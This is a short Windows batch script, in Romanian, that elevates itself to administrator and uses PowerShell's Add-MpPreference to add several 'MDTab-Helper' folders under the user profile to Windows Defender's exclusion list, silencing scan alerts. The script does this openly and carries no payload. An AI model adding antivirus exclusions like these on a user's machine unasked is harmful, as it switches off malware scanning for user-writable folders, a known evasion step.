@echo off
setlocal
echo =========================================================
echo   Adaugare Folder MDTab-Helper in Excluderile Antivirus
echo =========================================================
echo.

:: Verifica daca scriptul ruleaza ca Administrator, iar daca nu, cere permisiune
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Se solicita permisiuni de Administrator...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

echo Se adauga folderele aplicatiei in lista de excluderi Windows Defender...
echo.

powershell -NoProfile -Command "Add-MpPreference -ExclusionPath '%USERPROFILE%\Desktop\MDTab-Helper', '%USERPROFILE%\Desktop\MDTab-Helper-Old', '%LOCALAPPDATA%\MDTab-Helper', '%APPDATA%\MDTab-Helper' -ErrorAction SilentlyContinue"

echo.
echo =========================================================
echo   SUCCES! Folderele au fost adaugate in excluderile
echo   Windows Defender. Nu vor mai aparea mesaje de scanare.
echo =========================================================
echo.
pause
